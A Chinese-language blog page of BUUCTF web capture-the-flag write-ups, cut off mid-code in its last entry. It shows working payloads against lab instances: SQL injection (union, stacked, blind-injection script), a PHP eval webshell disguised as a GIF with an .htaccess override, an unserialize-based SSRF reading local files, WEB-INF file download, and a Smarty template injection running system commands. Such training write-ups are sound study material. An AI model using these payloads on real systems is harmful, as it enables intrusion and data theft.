<img src="/images/buuctf-web/image-20221017192403857.png" alt="image-20221017192403857" style="zoom:67%;" />



<br>

<hr>
<br>



<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>在尝试各种方法注入的过程中,发现返回内容中有一串字符:</p>
<img src="/images/buuctf-web/image-20221017200430122.png" alt="image-20221017200430122" style="zoom:67%;" />

<p>这段字符比较像<code>base32</code>编码后的形态,将其使用<code>base</code>32解码得到:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</span><br></pre></td></tr></table></figure>

<p>这显然是<code>base64</code>了,继续解码得到查询语句:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>

<p>这里注入点在<code>name</code>上, 这里没有将<code>name</code>和<code>password</code>一起查询,那么应该是先通过<code>name</code>查询到对应的结果,将其中的<code>password</code>和用户输入的<code>password</code>相比较. 这里<code>select *</code>会返回相应用户名的所有数据</p>
<p><strong>那么可以使得<code>select * from user where username = &#39;$name&#39;</code>的结果为空,然后后面附加上<code>union select</code></strong></p>
<p><strong>这样整条查询语句的结果就是<code>union select</code>的结果,那么验证密码时就会错误地把<code>union select</code>对应位置上的值当成密码</strong></p>
<p>先测试<code>select *</code>结果的字段数:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,2#&amp;pw=123</span><br><span class="line">返回:Error: The used SELECT statements have a different number of columns</span><br><span class="line">name=1&#x27; union select 1,2,3#&amp;pw=123</span><br><span class="line">返回:wrong user!</span><br><span class="line">这里说明结果有三列</span><br></pre></td></tr></table></figure>

<p>下面测试用户名在这三列中的哪个位置:(因为整个<code>union select</code>的结果都是伪造的,所以这里<code>admin</code>换成别的什么也一样)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,3#&amp;pw=123</span><br><span class="line">返回:wrong pass!</span><br><span class="line">说明用户名在第二个位置</span><br></pre></td></tr></table></figure>

<p>那么尝试把密码也加上:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;admin&#x27;#&amp;pw=admin</span><br><span class="line">返回:wrong pass!</span><br><span class="line">这里并没有起作用,考虑一下密码经常用md5的形式存储,并且在密码中输入类似admin&#x27; 时也不会报错,那么应该是对用户输入的密码进行了md5处理.</span><br></pre></td></tr></table></figure>

<p>那么这里对<code>admin</code>进行<code>md5</code>处理,然后再填入密码的位置上:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;21232f297a57a5a743894a0e4a801fc3&#x27;#&amp;pw=admin</span><br><span class="line">返回:flag&#123;96c9a844-2281-40a2-be8b-8900ba1ff455&#125;</span><br></pre></td></tr></table></figure>



<br>

<hr>
<br>

<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>直接把一句话木马改成图片格式,上传成功:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt; @eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;</span><br><span class="line">/var/www/html/upload/5b17b3346cc2ba84ebe30b3bcaf6a1d9/scri.jpg succesfully uploaded!</span><br></pre></td></tr></table></figure>

<p>接下来考虑怎么样利用</p>
<p>尝试访问一下<code>上传目录/index.php</code>,看看有没有现成可用的<code>php文件</code>,如果有的话可以考虑用<code>.user.ini</code>对一句话木马文件进行包含. 并没有找到</p>
<p>那么试试上传<code>.htaccess</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;scri.jpg&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>应该是对文件类型进行了检测<img src="/image/buuctf-web/image-20221018085753152.png" alt="image-20221018085753152"></p>
<p>那么就抓包修改一下:</p>
<img src="/images/buuctf-web/image-20221018085916924-166704781973576.png" alt="image-20221018085916924" style="zoom:67%;" />

<p>这次上传成功</p>
<p>蚁剑连接后在根目录找到flag</p>
<img src="/images/buuctf-web/image-20221018085958237-166704781973577.png" alt="image-20221018085958237" style="zoom:67%;" />





<br>

<hr>
<br>

<h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221018090848491-166704781973578.png" alt="image-20221018090848491" style="zoom:67%;" />

<p>那么查询语句应该类似: <code>select id,name from 表名 where id = &#39;$输入&#39;;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入:1&#x27; union select version(),database()#</span><br><span class="line">返回了过滤内容</span><br><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>那么使用<code>show</code>来进行注入:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;# 爆库名</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221018091315148-166704781973579.png" alt="image-20221018091315148" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables;# 爆表名</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221018091417095-166704781973580.png" alt="image-20221018091417095" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show columns from FlagHere;# 爆列名</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221018091457650-166704781973581.png" alt="image-20221018091457650" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler FlagHere open;handler FlagHere read first; 读取数据</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221018091846885-166704781973582.png" alt="image-20221018091846885" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>经过测试,空格被过滤了,那么使用<strong>括号</strong>来代替</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0)   //ascii码102为f</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221018095142467.png" alt="image-20221018095142467" style="zoom:67%;" />

<p>提交上述内容,返回了<code>id=1</code>时的结果 (如果<code>if</code>语句的值为1,则整体语句为<code>1=1</code>,值为<code>True</code>,也就会返回<code>id=1</code>时的查询内容,如果<code>if</code>语句的值为0,则整体语句为<code>1=0</code>,值为<code>False</code>)</p>
<blockquote>
<p><strong><code>sql</code>中的<code>if</code>语句: <code>IF( expr1 , expr2 , expr3 )</code></strong></p>
<p><strong>如果<code>exp1</code>的值为<code>True</code>,则返回<code>expr2</code></strong></p>
<p><strong>如果<code>exp1</code>的值为<code>False</code>,则返回<code>expr3</code></strong></p>
</blockquote>
<p>利用这一点,可以使用脚本来进行盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">chars = <span class="string">&quot;qwertyuioplkjhgfdsazxcvbnm1234567890&#125;&#123;&quot;</span>  <span class="comment"># 返回所有可打印的字母，数字，符号的集合</span></span><br><span class="line"><span class="comment"># print(chars)</span></span><br><span class="line">base_url = <span class="string">&quot;http://38133c0f-4b3f-4bb9-b42b-e25804a8ce2b.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">        time.sleep(<span class="number">1</span>) <span class="comment">#防止429</span></span><br><span class="line">        query = <span class="string">&#x27;1=if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(c))</span><br><span class="line">        <span class="built_in">print</span>(query)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: query</span><br><span class="line">        &#125;</span><br><span class="line">        response = session.post(base_url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;glzjin&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">            flag = flag+c</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>





<br>

<hr>
<br>

<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>进去有一个注册页面,分别是<code>username</code>,<code>password</code>,<code>age</code>和<code>blog</code>三项,随便填写内容后提交显示<code>blog not valid</code></p>
<p>那这里<code>blog</code>可能是要填一个博客的网址,尝试填写<code>www.baidu.com</code>,注册通过</p>
<img src="/images/buuctf-web/image-20221018120804283-166704781973583.png" alt="image-20221018120804283" style="zoom:67%;" />

<p>查看源码发现点击<code>username</code>那里的<code>abc</code>,会打开<code>view.php</code>,并传参<code>no</code>,这个<code>no</code>应该是用户的ID</p>
<img src="/images/buuctf-web/image-20221018120842828-166704781973584.png" alt="image-20221018120842828" style="zoom:67%;" />

<p>点击后进入了用户信息界面,这里应该是<strong>后台进行了sql查询, 那么可能存在注入点.</strong>.</p>
<p>查看源码后这里发现了<code>base64</code>编码后的内容:</p>
<img src="/images/buuctf-web/image-20221018121149810.png" alt="image-20221018121149810" style="zoom:80%;" />

<p>解码后发现是百度的源码,那么这里服务器根据<code>blog</code>中的网址去请求了网页的内容</p>
<p>那么同样地,如果这里填写<code>file://</code>这种读取本地文件的协议,应该也可以执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://004f0382-17c4-4956-ac3e-f59cd1962fa9.node4.buuoj.cn:81/join.php</span><br><span class="line">http://004f0382-17c4-4956-ac3e-f59cd1962fa9.node4.buuoj.cn:81/login.php</span><br></pre></td></tr></table></figure>

<p>直接在注册页提交的话会爆<code>not valid</code>无法通过:</p>
<img src="/images/buuctf-web/image-20221018152903248-166704781973585.png" alt="image-20221018152903248" style="zoom:67%;" />

<p>测试一下<code>view.php</code>的<code>no</code>参数是否存在注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#</span><br></pre></td></tr></table></figure>

<p>出现报错,说明存在注入漏洞, 下面尝试一下<code>union</code>,存在关键词过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=3 union select 1,2,3,4#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221018122717667-166704781973586.png" alt="image-20221018122717667" style="zoom:67%;" />

<p>经过测试,这里单独输入<code>1,</code>,<code>1union</code>,<code>1select</code>,等都会直接报错,而不会报<code>hack</code>,那么过滤关键词可能是<code>union select</code>,那么只要使用<code>/**/</code>来绕过空格就好了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=3 union/**/select 1,2,3,4#</span><br></pre></td></tr></table></figure>

<p>可以看到这里爆了反序列化的错误:</p>
<img src="/images/buuctf-web/image-20221018123424162-166704781973587.png" alt="image-20221018123424162" style="zoom: 80%;" />

<p>这里先尝试用<code>2</code>这个位置继续注入看看,多获得一些信息:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">no=3 union/**/select 1,database(),3,4#</span><br><span class="line">---库名: fakebook</span><br><span class="line">no=3 union/**/select 1,group_concat(TABLE_NAME),3,4 from information_schema.TABLES where table_schema=&#x27;fakebook&#x27;#</span><br><span class="line">---表名: users</span><br><span class="line">no=3 union/**/select 1,group_concat(COLUMN_NAME),3,4 from information_schema.COLUMNS where table_schema=&#x27;fakebook&#x27; and table_name=&#x27;users&#x27;#</span><br><span class="line">---列名: no,username,passwd,data</span><br><span class="line">no=3 union/**/select 1,group_concat(no,&#x27;,&#x27;,username,&#x27;,&#x27;,passwd,&#x27;,&#x27;,data),3,4 from users#</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">1,  //id</span><br><span class="line">abc,  //username</span><br><span class="line">cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e, </span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;abc&quot;;s:3:&quot;age&quot;;i:1234;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里<code>data</code>输出的是一个可被反序列化的字符串, 那么还原一下这里的查询过程,应该是</p>
<p>传id值后, sql查询到此id对应的<code>data</code>字段值, 也就是序列化的字符串, 将这个字符串反序列化之后,将得到的各个属性值呈现在<code>view.php</code>的查询结果中,并且要去请求<code>blog</code>属性中的网址,返回网站内容</p>
<p><strong>这里访问<code>robots.txt</code>发现以下内容:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak //有一个备份文件</span><br></pre></td></tr></table></figure>

<p>访问并下载,打开后发现了源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里得到了<code>UserInfo</code>类的源码,可以以此来构造反序列化的字符串了</p>
<p>另外,注意到, 上面最后的注入结果中的有四个字段, 应该正好能对上<code>union select</code>后的四个位置,其中存储序列化字符串的<code>data</code>在最后一个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//运行得到用于反序列化的字符串</span></span><br><span class="line"><span class="comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:23;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=3 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:23;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>查看源码得到编码后的flag,解码即可</p>
<img src="/images/buuctf-web/image-20221018130216720.png" alt="image-20221018130216720" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>进来是一个登录页面,下面有个help,点击结果显示找不到文件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221018154244298-166704781973588.png" alt="image-20221018154244298" style="zoom:67%;" />

<p>查看源码发现这里的连接是给<code>/Download</code>传一个<code>filename</code>参数,这里比较像文件包含了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Download?filename=help.docx</span><br></pre></td></tr></table></figure>

<p><code>GET</code>请求不到的话,把这里的参数换到POST中试试:</p>
<img src="/images/buuctf-web/image-20221018154521680-166704781973589.png" alt="image-20221018154521680" style="zoom:67%;" />

<p>成功下载了<code>help.docx</code>,结果打开之后啥也不是…</p>
<img src="/images/buuctf-web/image-20221018154600400-166704781973590.png" alt="image-20221018154600400" style="zoom:67%;" />

<p>但是此处的文件包含漏洞是确实存在的,可以尝试用它去下载一下其他文件</p>
<p>这里的网站是使用<code>JAVA</code>搭建的,这里可以尝试读取一下<code>WEB-INF</code>目录下面的文件,详见<a href="9076add.html">JAVA_web</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/web.xml</span><br></pre></td></tr></table></figure>

<p>成功下载了<code>WEB-INF/web.xml</code></p>
<p>在该文件中找到了一个名为<code>FlagController</code>的类</p>
<img src="/images/buuctf-web/image-20221018160645549-166704781973591.png" alt="image-20221018160645549" style="zoom:67%;" />

<p>先按照下面给的路径用浏览器访问一下试试: 这里爆了500错误,但是错误信息里给出了这个类的路径:</p>
<img src="/images/buuctf-web/image-20221018160755237-166704781973592.png" alt="image-20221018160755237" style="zoom:67%;" />

<p>那么还是用刚才的方法下载该文件,注意的文件后缀名是<code>.class</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>

<p>下载并打开后发现有一段<code>base64</code>编码: 解码后得到flag</p>
<img src="/images/buuctf-web/image-20221018161405168-166704781973593.png" alt="image-20221018161405168" style="zoom:67%;" />

<br>

<hr>
<br>

<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>左上角有三个链接,其中点击第一个是返回首页</p>
<img src="/images/buuctf-web/image-20221018162320664-166704781973594.png" alt="image-20221018162320664" style="zoom:67%;" />



<p>点击<code>Flag</code>,显示:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your IP is : 10.244.80.206 </span><br></pre></td></tr></table></figure>

<p>点击<code>Hint</code>然后查看源码: 有个没什么用的提示</p>
<img src="/images/buuctf-web/image-20221018162600950-166704781973596.png" alt="image-20221018162600950" style="zoom:67%;" />

<p>那么这里尝试添加以下<code>XFF</code>头字段,看看页面显示的IP会不会发生变化: 确实</p>
<img src="/images/buuctf-web/image-20221018174802686-166704781973595.png" alt="image-20221018174802686" style="zoom:67%;" />



<p>这里<code>XFF</code>字段的内容会被拼接到相应页面上,那么是否可以利用此来执行命令</p>
<p>这里的知识点是<code>SSTI</code>中的<code>smarty</code>模板注入,具体见<a href="47d18edd.html">SSTI</a></p>
<img src="/images/buuctf-web/image-20221018175617235-166704781973597.png" alt="image-20221018175617235" style="zoom:67%;" />



<p>直接读取flag文件:</p>
<img src="/images/buuctf-web/image-20221018184357732-166704781973598.png" alt="image-20221018184357732" style="zoom:67%;" />



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;system(&quot;cat /flag&quot;)&#125;</span><br></pre></td></tr></table></figure>





<br>

<hr>
<br>

<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125; <span class="comment">//传XFF字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123; <span class="comment">//GET传参数host</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span 